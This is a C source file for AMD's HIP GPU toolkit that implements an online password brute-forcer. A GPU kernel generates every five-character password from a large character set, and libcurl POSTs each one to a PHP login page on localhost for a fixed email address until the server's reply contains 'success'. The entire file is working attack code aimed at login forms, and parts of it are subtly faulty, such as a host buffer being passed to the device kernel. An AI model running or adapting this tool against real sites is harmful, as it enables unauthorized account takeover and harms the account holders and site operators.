#include "hip/hip_runtime.h"
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <hip/hip_runtime.h>
#include <math.h> // Include for pow function

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realSize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = (char *)realloc(mem->memory, mem->size + realSize + 1); // +1 for null terminator
    if(ptr == NULL) {
        fprintf(stderr, "not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realSize);
    mem->size += realSize;
    mem->memory[mem->size] = '\0'; // Null-terminate the buffer
    return realSize;
}

CURL *curl_init_session() {
    CURL *curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); // Enable cookie handling
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L); // Follow HTTP redirects
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    }
    return curl;
}

int attempt_login(CURL *curl, const char *url, const char *email, char *password) {
    struct MemoryStruct chunk;
    chunk.memory = (char *)malloc(1); // initially allocate 1 byte, explicitly cast
    chunk.size = 0;

    char postfields[256];
    sprintf(postfields, "signIn=true&email=%s&password=%s", email, password);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    CURLcode res = curl_easy_perform(curl);

    int success = 0;
    if(res == CURLE_OK) {
        if(strstr(chunk.memory, "success")) {
            printf("Password found: %s\n", password);
            success = 1;
        } else {
            printf("Login failed for password: %s. Server response was: %s\n", password, chunk.memory);
        }
    } else {
        fprintf(stderr, "CURL request failed for password '%s': %s\n", password, curl_easy_strerror(res));
    }

    free(chunk.memory);
    return success;
}

__global__ void generatePasswords(char *chars, int numChars, char *allPasswords, int totalPasswords) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;
    if(idx < totalPasswords) {
        int n = numChars;
        int localIdx = idx;
        allPasswords[idx * 6 + 5] = '\0';  // Ensure null termination for each password
        for(int i = 4; i >= 0; i--) {
            allPasswords[idx * 6 + i] = chars[localIdx % n];
            localIdx /= n;
        }
    }
}

void generatePasswordsAndTest(CURL *curl, const char *url, const char *email, char *chars, int numChars) {
    int totalPasswords = pow(numChars, 5);  // Assume 5-character passwords
    size_t sizeOfAllPasswords = totalPasswords * 6 * sizeof(char);  // 6 includes the null terminator
    char *allPasswordsHost = (char *)malloc(sizeOfAllPasswords);
    char *allPasswordsDevice;

    hipMalloc((void **)&allPasswordsDevice, sizeOfAllPasswords);
    hipMemcpy(allPasswordsDevice, allPasswordsHost, sizeOfAllPasswords, hipMemcpyHostToDevice);

    int threadsPerBlock = 256;
    int blocksPerGrid = (totalPasswords + threadsPerBlock - 1) / threadsPerBlock;

    generatePasswords<<<blocksPerGrid, threadsPerBlock>>>(chars, numChars, allPasswordsDevice, totalPasswords);

    hipMemcpy(allPasswordsHost, allPasswordsDevice, sizeOfAllPasswords, hipMemcpyDeviceToHost);

    for(int i = 0; i < totalPasswords; i++) {
        if(attempt_login(curl, url, email, &allPasswordsHost[i * 6])) {
            printf("Password found: %s\n", &allPasswordsHost[i * 6]);
            break;
        }
    }

    free(allPasswordsHost);
    hipFree(allPasswordsDevice);
}

int main(void) {
    const char *email = "a@gmail.com"; // The email to test
    const char *url = "http://localhost/login/register.php"; // URL to the PHP script for login
    char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=[]{}|;:,.<>?";
    int numChars = strlen(chars);

    CURL *curl = curl_init_session();
    if(curl) {
        generatePasswordsAndTest(curl, url, email, chars, numChars);
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "CURL initialization failed\n");
    }
    curl_global_cleanup();
    return 0;
}
